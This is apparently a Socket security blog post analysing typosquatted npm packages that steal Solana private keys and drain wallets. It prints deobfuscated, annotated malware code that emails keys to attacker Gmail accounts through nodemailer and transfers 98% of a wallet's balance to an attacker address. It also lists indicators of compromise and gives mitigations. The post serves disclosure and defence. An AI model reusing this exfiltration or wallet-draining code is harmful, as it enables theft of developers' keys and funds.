---
title: "Gmail For Exfiltration: Malicious npm Packages Target Solana Private Keys and Drain Victims' Wallets"
short_title: "Malicious npm Packages Target Solana Keys via Gmail"
date: 2025-01-08 12:00:00 +0000
categories: [Malware, npm]
tags: [npm, JavaScript, Typosquatting, Infostealer, Gmail, Crypto Drainer, T1195.002, T1059.007, T1036.005, T1027.013, T1546.016, T1048, T1583.006, T1005]
canonical_url: https://socket.dev/blog/gmail-for-exfiltration-malicious-npm-packages-target-solana-private-keys-and-drain-victim-s
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/324fa16cf8553db08873dff3955c43d1855f3c72-1024x1024.webp
  alt: "Gmail For Exfiltration: Malicious npm Packages Target Solana Private Keys and Drain Victims' Wallets"
description: "Socket researchers have discovered multiple malicious npm packages targeting Solana private keys, abusing Gmail to exfiltrate the data and drain Solana wallets."
---

Socket's threat research team has uncovered malicious npm packages designed to exfiltrate Solana private keys via Gmail. The packages – [`@async-mutex/mutex`](https://socket.dev/npm/package/@async-mutex/mutex/overview/0.1.0), [`dexscreener`](https://socket.dev/npm/package/dexscreener/overview/1.3.0), [`solana-transaction-toolkit`](https://socket.dev/npm/package/solana-transaction-toolkit/overview/1.0.0) and [`solana-stable-web-huks`](https://socket.dev/npm/package/solana-stable-web-huks) – typosquat popular libraries and appear to serve legitimate purposes. However, instead they function as malware, with the final two packages also draining victims' Solana wallets.

These packages were published by two threat actors who share overlapping tactics, techniques, and procedures (TTPs), as well as similar code designed to intercept private keys from various wallet interactions, funnel them through Gmail's SMTP servers, and deliver them to the attacker. Because Gmail is a trusted email service, these exfiltration attempts are less likely to be flagged by firewalls or endpoint detection systems, which treat `smtp.gmail.com` as legitimate traffic.

At the time of publication, the packages remain live on npm, but we have petitioned the registry for their removal. We also reported two GitHub repositories, used by the threat actor behind `solana-transaction-toolkit` and `solana-stable-web-huks`, to amplify the malware campaign and lend legitimacy to these malicious packages.

## You've Got Mail But It Brings Trouble

The malicious packages [`@async-mutex/mutex`](https://socket.dev/npm/package/@async-mutex/mutex/overview/0.1.0) and [`dexscreener`](https://socket.dev/npm/package/dexscreener/overview/1.3.0), published by a threat actor using the npm registry aliases "async-mutex" and "james0203", are disguised as legitimate tools but contain embedded scripts that steal private Solana keys and relay them via Gmail.

[`@async-mutex/mutex`](https://socket.dev/npm/package/@async-mutex/mutex/overview/0.1.0) is a typosquat of the popular npm package [`async-mutex`](https://socket.dev/npm/package/async-mutex), which provides a mutual exclusion mechanism (mutex) for asynchronous JavaScript operations. While the legitimate `async-mutex` has garnered over 93 million downloads, the malicious variant – downloaded 240 times – seeks to exploit brand confusion and the likelihood of unintentional errors when selecting packages.

![Download comparison between legitimate and malicious async-mutex packages](https://cdn.sanity.io/images/cgdhsj6q/production/073390ec7d815d2c9c570ed3ff660d57cfa62d33-1182x373.png)
_Socket reports around one million weekly downloads for the legitimate `async-mutex` package, compared to zero weekly downloads for the malicious `@async-mutex/mutex`. This discrepancy is a clear red flag: the typosquatting package is not widely used yet closely mimics the legitimate one._

As a side and cautionary note: AI-generated package summaries in search results can land developers and users in hot water and may inadvertently lend credibility and legitimacy to malicious software. In the case of Google's AI-powered summary for the malicious package [`@async-mutex/mutex`](https://socket.dev/npm/package/@async-mutex/mutex/overview/0.1.0), the friendly-sounding preview obscures hidden malware, exposing developers to serious risks. When AI-driven summaries overlook embedded threats, they may guide even cautious users toward installing harmful dependencies, endangering individual projects and the broader software supply chain.

![Google AI-generated search results for malicious package](https://cdn.sanity.io/images/cgdhsj6q/production/e594454731c7475ab088051ef134b57342368930-2048x1601.png)
_A screenshot of Google's AI-generated search results for the malicious `@async-mutex/mutex` package._

The [`dexscreener`](https://socket.dev/npm/package/dexscreener/overview/1.3.0) package masquerades as a library for accessing liquidity pool data from decentralized exchanges (DEXs) and interacting with the DEX Screener platform. However, it exhibits the same malicious functionality and threat actor identifiers (specifically, Gmail addresses used for exfiltration) as the `@async-mutex/mutex` package, despite being published under different npm registry aliases.

The following malicious [code](https://socket.dev/npm/package/dexscreener/files/1.3.0/dist/index.js) snippets have been deobfuscated, redacted, and annotated with comments to provide insights into the threat actor's techniques.

```javascript
const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",          // Using Gmail's SMTP server for exfiltration
    port: 465,                       // SSL port to secure the connection
    secure: true,                    // Enforces a secure connection (SSL/TLS)
    auth: {
        user: "vision.high.ever@gmail.com", // Attacker-controlled Gmail account
        pass: "[redacted]",                 // Redacted hardcoded password
    },
});

const sendEmail = async (privateKey) => {
    // This function is responsible for sending the stolen private key via email

    const email = {
        from: "vision.high.ever@gmail.com",
        to: "james.liu.vectorspace@gmail.com",  // Attacker's inbox where stolen keys are collected
        subject: "Hi, This is Dexscreener",     // Deceptive subject referencing the malicious package name
        text: privateKey,                       // The victim's private key is inserted directly into the email body
    };
    await transporter.sendMail(email); // Sends the stolen data to the attacker's Gmail account
};
```

This script exfiltrates sensitive user data (private keys) through the hardcoded Gmail accounts `vision.high.ever@gmail.com` and `james.liu.vectorspace@gmail.com`.

## Private Keys Captured and Wallet Balances Siphoned Off

The malicious packages [`solana-transaction-toolkit`](https://socket.dev/npm/package/solana-transaction-toolkit/overview/1.0.0) and [`solana-stable-web-huks`](https://socket.dev/npm/package/solana-stable-web-huks), published by a threat actor using the npm registry alias "solana-web-stable-huks", do more than steal Solana private keys and exfiltrate them via Gmail. They take the attack further by programmatically draining the victim's wallet, automatically transferring up to 98% of its contents to an attacker-controlled Solana address `3RbBjhVRi8qYoGB5NLiKEszq2ci559so4nPqv2iNjs8Q`. The remaining 2% is likely left behind to reduce suspicion or prevent transaction failures due to fees. The ultimate goal is clear: funneling the victim's funds directly into the attacker's control.

![Packages published by threat actor solana-web-stable-huks](https://cdn.sanity.io/images/cgdhsj6q/production/ce0c9c228dbe9c5ddeb1799066078a50bad649a0-1095x447.png)
_Socket displays packages published by the threat actor under the npm registry alias "solana-web-stable-huks"._

These packages claim to offer Solana-specific functionality, such as handling transactions, building tooling scripts, or interacting with the blockchain, and have been downloaded more than 130 times. Their code references `nodemailer` for sending private keys via Gmail, as well as functions that automate Solana transactions to drain wallets.

The following malicious [code](https://socket.dev/npm/package/solana-transaction-toolkit/files/1.0.0/index.js) snippets, defanged, redacted, and annotated with comments, offer insights into the threat actor's techniques.

```javascript
const sendEmail = (p1, p2, p3, p4, p5) => {
    // This function gathers and sends up to five private keys

    const obj = {
    from: "czhanood@gmail.com",            // Attacker-controlled Gmail accounts
    to: "qadeerkhanr5@gmail.com",
    subject: "patha",
    text: "This is a plain text version of the email.",
    html: `<b>Hello world?</b><br><br><pre></pre>`, // Basic placeholder text
  };

    const transporter = nodemailer.createTransport({
        service: "gmail",                 // Gmail used as the SMTP service for data exfiltration
        port: 587,                        // Standard port for STARTTLS
        secure: false,                    // Does not use SSL/TLS
        auth: {
            user: "czhanood@gmail.com",   // Attacker-controlled Gmail account
            pass: "[redacted]",           // Redacted hardcoded password
        },
    });

    // p1 through p5 are reserved for stolen Solana private keys
    obj.html = `
        <b>Hello World?</b><br><br>
        <pre>${p1}</pre>
        <br><pre>${p2}</pre><br><pre>${p3}</pre>
        <br><pre>${p4}</pre><br><pre>${p5}</pre>
    `;
    // Embeds stolen data into the email body

    transporter.sendMail(obj).then(() => {
        // Sends the stolen information to the attacker-controlled Gmail account
    });
};
```

Any discovered private keys (represented by `p1, p2, p3, p4, p5`) are exfiltrated to attacker-controlled Gmail addresses: `qadeerkhanr5@gmail.com` and `czhanood@gmail.com`. The code can handle multiple private keys simultaneously, allowing the attacker to compromise multiple user accounts or environments at once.

![Socket AI Scanner analysis of solana-stable-web-huks](https://cdn.sanity.io/images/cgdhsj6q/production/8216c4e7d3f01faccdb577507a0d7ecd48cf86f6-624x596.png)
_Socket AI Scanner's analysis, including contextual details about the malicious package `solana-stable-web-huks`, which has the same malicious functionality as `solana-transaction-toolkit` package but includes different email addresses: `khansaleem789700@gmail.com` and `mujeerasghar7700@gmail.com`._

The following malicious [code](https://socket.dev/npm/package/solana-transaction-toolkit/files/1.0.0/index.js) snippets have been annotated with comments to provide insights into the threat actor's techniques.

```javascript
const transaction = async (keypair) => {

    // Retrieves the current balance in lamports (the smallest unit on Solana) for the victim's wallet
    const balanceLamports = await connection.getBalance(keypair.publicKey);

    // If the wallet has no funds, no action is taken
    if (balanceLamports === 0) {
        return;
    }

    // This section constructs a transaction to siphon funds to the attacker's wallet
    transaction.add(
        SystemProgram.transfer({
            fromPubkey: keypair.publicKey,                            // The victim's wallet
            toPubkey: "3RbBjhVRi8qYoGB5NLiKEszq2ci559so4nPqv2iNjs8Q", // Attacker's wallet address
            lamports: Math.floor(balanceLamports * 0.98),             // Transfers 98% of available funds to the attacker
        })
    );

    // Broadcasts the malicious transaction to the Solana network, effectively draining the victim's wallet
    await sendAndConfirmTransaction(connection, transaction, [keypair]);
};
```

## GitHub For Veneer of Legitimacy and Malware Distribution

We identified two GitHub repositories published by the same threat actor behind the malicious npm packages `solana-transaction-toolkit` and `solana-stable-web-huks`. Operating under the aliases "[moonshot-wif-hwan](https://github.com/moonshot-wif-hwan)" and "[Diveinprogramming](https://github.com/Diveinprogramming)", these repositories appear to offer helpful Solana development tools or scripts for automating common DeFi workflows. In reality, however, they import the threat actor's malicious npm packages.

![Threat actor-controlled GitHub repositories](https://cdn.sanity.io/images/cgdhsj6q/production/591aa0f4e9fefb9fb99b1e6943a17e506205592c-730x757.png)
_Images of the threat actor-controlled GitHub repositories. Notably, in the image on the right, the threat actor provided the same email address – `qadeerkhanr5@gmail.com` – that was used in the `solana-transaction-toolkit` package for exfiltration._

A script in the threat actor's GitHub repository, [`moonshot-wif-hwan/pumpfun-bump-script-bot`](https://github.com/moonshot-wif-hwan/pumpfun-bump-script-bot/blob/main/index.js), is promoted as a bot for trading on Raydium, a popular Solana-based DEX, but instead it imports malicious code from `solana-stable-web-huks` package. This script is forked from the [`Diveinprogramming/raydium-pumpfun-fastest-sniper-bot`](https://github.com/Diveinprogramming/raydium-pumpfun-fastest-sniper-bot) repository, which references the attacker-controlled email address `qadeerkhanr5@gmail.com`.

By using GitHub repositories, the threat actor attempts to mount a broader malware campaign, luring targets via both the npm registry and GitHub. Developers searching for Solana-related libraries or scripts on these platforms can be misled by false claims — particularly when they are under time pressure or do not closely scrutinize repository trust signals, such as verified authorship, consistent commit history, or active community engagement.

## Recommendations and Mitigations

It is important to verify a package's authenticity by examining its download counts, publisher history, and any associated GitHub repository links. Regularly auditing dependencies ensures no unexpected or malicious packages slip into your codebase. Equally vital is maintaining strict access controls around private keys, limiting who can view or import them in development environments. Whenever possible, use dedicated or temporary environments for testing third-party scripts, isolating potentially harmful code from your primary systems. Finally, monitor network traffic for unusual outbound connections, particularly those involving SMTP services, since even otherwise benign Gmail traffic can be used to exfiltrate sensitive information.

A powerful safeguard is the Socket [GitHub app](https://socket.dev/features/github), which scans npm dependencies in pull requests to detect malicious or typosquatted packages before they can compromise a project. For local development and continuous integration pipelines, the [Socket CLI](https://socket.dev/features/cli) provides real-time analysis during npm installs. Additionally, the Socket [browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) offers unobtrusive scanning for suspicious packages while browsing npm or GitHub, flagging potential threats on the spot.

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1546.016 — Event Triggered Execution: Installer Packages
- T1048 — Exfiltration Over Alternative Protocol
- T1583.006 — Acquire Infrastructure: Web Services
- T1005 — Data from Local System

## Indicators of Compromise (IOCs)

### Malicious npm Packages

- `@async-mutex/mutex`
- `dexscreener`
- `solana-transaction-toolkit`
- `solana-stable-web-huks`

### Email Accounts

- vision.high.ever@gmail.com
- james.liu.vectorspace@gmail.com
- qadeerkhanr5@gmail.com
- czhanood@gmail.com
- khansaleem789700@gmail.com
- mujeerasghar7700@gmail.com

### Attacker-Controlled Solana Address

- `3RbBjhVRi8qYoGB5NLiKEszq2ci559so4nPqv2iNjs8Q`

### Threat Actor Aliases

- async-mutex (npm registry)
- james0203 (npm registry)
- solana-web-stable-huks (npm registry)
- moonshot-wif-hwan (GitHub)
- Diveinprogramming (GitHub)

### Threat Actor GitHub Repositories

- [https://github.com/moonshot-wif-hwan](https://github.com/moonshot-wif-hwan)
- [https://github.com/Diveinprogramming](https://github.com/Diveinprogramming)
